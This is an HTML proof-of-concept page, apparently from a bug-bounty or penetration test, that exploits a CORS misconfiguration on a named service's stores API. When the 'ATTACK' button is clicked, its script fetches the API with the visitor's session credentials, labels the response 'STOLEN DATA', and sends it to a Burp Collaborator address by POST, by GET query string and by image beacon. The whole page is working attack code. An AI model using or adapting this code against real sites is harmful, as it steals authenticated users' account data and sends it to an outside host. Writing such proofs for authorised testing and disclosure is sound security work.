<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC</title>
</head>
<body>
    <h1>CORS Attack</h1>
    
    <label>Collaborator URL:</label><br>
    <input type="text" id="collab" value="https://your-id.burpcollaborator.net" style="width:400px;padding:5px;"><br><br>
    
    <button onclick="attack()" style="padding:10px 20px;font-size:16px;">ATTACK</button>

    <script>
        function attack() {
            var COLLAB = document.getElementById('collab').value;
            
            if (!COLLAB || COLLAB === 'https://your-id.burpcollaborator.net') {
                alert('Please set your collaborator URL first!');
                return;
            }
            
            // Fetch API
            fetch('https://dashboard.route.com/api/mn/v1/stores', {
                method: 'GET',
                credentials: 'include',
                mode: 'cors'
            })
            .then(response => response.text())
            .then(data => {
                // Alert the response
                alert('STOLEN DATA:\n\n' + data);
                
                // Send to collaborator
                sendToCollab(data, COLLAB);
                
                alert('Data sent to: ' + COLLAB);
            })
            .catch(err => {
                alert('Error: ' + err.message + '\n\nMake sure you are logged in to dashboard.route.com');
            });
        }

        function sendToCollab(data, collab) {
            // Method 1: POST
            fetch(collab, {
                method: 'POST',
                mode: 'no-cors',
                body: data
            });
            
            // Method 2: GET
            fetch(collab + '?data=' + encodeURIComponent(data), {
                mode: 'no-cors'
            });
            
            // Method 3: Image
            new Image().src = collab + '/img?d=' + encodeURIComponent(data.substring(0, 500));
            
            console.log('Data sent to:', collab);
        }
    </script>
</body>
</html>
